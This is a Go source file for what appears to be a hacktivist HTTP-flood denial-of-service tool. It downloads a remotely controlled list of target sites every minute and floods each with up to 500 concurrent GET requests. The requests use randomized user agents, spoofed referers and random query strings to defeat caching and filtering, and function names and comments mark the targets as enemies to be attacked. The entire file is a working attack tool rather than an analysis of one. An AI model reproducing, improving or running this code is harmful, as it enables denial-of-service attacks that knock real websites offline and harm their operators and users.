package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
)

type StrikeItem struct {
	Id           int         `json:"id"`
	Url          string      `json:"url"`
	Page         string      `json:"page"`
	Atack        interface{} `json:"atack"`
	NeedParseUrl int         `json:"need_parse_url"`
	PageTime     interface{} `json:"page_time"`
	Protocol     string      `json:"protocol"`
	Port         interface{} `json:"port"`
}

// type proxyItem struct {
// 	sites   int
// 	ip   string
// 	auth string
// }

// type strikeItems struct {
// 	sites  []strikeItem
// }

const (
	// strikeUrl             = "https://gitlab.com/cto.endel/atack_hosts/-/raw/master/sites.json"
	strikeUrl             = "https://hutin-puy.nadom.app/sites.json"
	strikeRefreshInterval = 60 * time.Second
	// strikeRefreshInterval = 15 * time.Second

	// strikeRefreshing uint8 = iota
	// strikeListReady
	// strikeListProcessing
)

var (
	strikeList    []StrikeItem
	noProxyClient *http.Client
	proxyClient   *http.Client
)

func main() {
	var limiter chan struct{} = make(chan struct{}, 500)
	var refresher chan struct{} = make(chan struct{}, 1)

	tr := http.DefaultTransport.(*http.Transport).Clone()
	tr.Proxy = nil
	noProxyClient = &http.Client{Transport: tr}

	tr2 := http.DefaultTransport.(*http.Transport).Clone()
	tr2.IdleConnTimeout = 8 * time.Second
	tr2.DialContext = (&net.Dialer{
		Timeout:   4 * time.Second,
		KeepAlive: 30 * time.Second,
	}).DialContext
	proxyClient = &http.Client{Transport: tr2}

	if err := fetchStrikeList(refresher); err != nil {
		fmt.Printf("failed to fetch Strike list: %v\n", err)
		os.Exit(9)
	}
	startStrikeListRefresher(refresher)

	for {
		refresher <- struct{}{} // locks a slot
		// fmt.Println("start processing strikeList")

		go func(r, l chan struct{}) {
			defer func() { <-r }() // frees a slot
			for _, strike := range strikeList {
				atack, ok := strike.Atack.(bool)
				if !ok {
					if atack, ok := strike.Atack.(int); !ok || atack == 0 {
						continue
					}

				} else if !atack {
					continue
				}

				l <- struct{}{} // locks a slot
				go func(huilo StrikeItem, l chan struct{}) {
					defer func() { <-l }() // frees a slot
					_ = greetingsTorussiaWarShip(huilo)
				}(strike, l)

			}
			// fmt.Println("completed processing strikeList")
		}(refresher, limiter)
	}
}

func fetchStrikeList(r chan struct{}) error {
	r <- struct{}{} // locks a slot
	defer func() {
		<-r // frees a slot
	}()

	var (
		body []byte
		resp *http.Response
		req  *http.Request
		err  error
	)

	req, err = http.NewRequest(http.MethodGet, strikeUrl, nil)
	if err != nil {
		fmt.Printf("failed to create new Request for Strike List: %v\n", err)
	}

	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Accept-Charset", acceptCharset)
	req.Header.Set("Accept", "text/json, application/json")

	resp, err = noProxyClient.Do(req)
	if err != nil {
		fmt.Printf("failed to execute strike List update request: %v\n", err)
	}
	defer resp.Body.Close()

	body, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read strike List body: %v, %d", err, resp.StatusCode)
	}

	if err = json.Unmarshal(body, &strikeList); err != nil {
		return fmt.Errorf("failed to parse json of strike list: %v", err)
	}

	fmt.Printf("* * fetched sites list successfully! %d * *\n", len(strikeList))

	return err
}

func startStrikeListRefresher(r chan struct{}) {
	ticker := time.NewTicker(strikeRefreshInterval)

	go func(r chan struct{}) {
		for {
			select {
			case <-ticker.C:
				if err := fetchStrikeList(r); err != nil {
					fmt.Println("failed to fetch string List. retrying...")
					fmt.Println(err.Error())
					fetchStrikeList(r)
				}
				ticker.Reset(strikeRefreshInterval)
			}
		}
	}(r)
}

func greetingsTorussiaWarShip(huilo StrikeItem) error {
	req, err := http.NewRequest(http.MethodGet, huilo.PagePayload(), nil)
	if err != nil {
		fmt.Printf("couldn't create new request: %v\n", err)
		return err
	}

	// req.Header.Add("Content-Type", "application/json")
	req.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
	req.Header.Set("Cache-Control", "no-cache")
	req.Header.Set("Accept-Charset", acceptCharset)
	req.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
	req.Header.Set("Keep-Alive", strconv.Itoa(rand.Intn(10)+100))
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Host", huilo.Url)

	fmt.Printf("attacking %s\n", huilo.Url)

	resp, err := proxyClient.Do(req)
	if err != nil {
		return fmt.Errorf("failed to fuck ship: %v\n", err)
	}
	defer resp.Body.Close()

	_, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read ship: %v, %d", err, resp.StatusCode)
	}

	return nil
}

var headersUseragents []string = []string{
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
	"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
	"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
	"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
}

var headersReferers []string = []string{
	"http://www.google.com/?q=",
	"http://www.usatoday.com/search/results?q=",
	"http://engadget.search.aol.com/search?q=",
	"http://www.google.ru/?hl=ru&q=",
	"http://yandex.ru/yandsearch?text=",
}

const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"

func buildblock(size int) (s string) {
	var a []rune
	for i := 0; i < size; i++ {
		a = append(a, rune(rand.Intn(25)+65))
	}
	return string(a)
}

func (si *StrikeItem) PagePayload() string {
	var paramJoiner string
	if strings.ContainsRune(si.Page, '?') {
		paramJoiner = "&"
	} else {
		paramJoiner = "?"
	}

	return fmt.Sprintf("%s%s%s=%s", si.Page, paramJoiner, buildblock(rand.Intn(7)+3), buildblock(rand.Intn(7)+3))
}
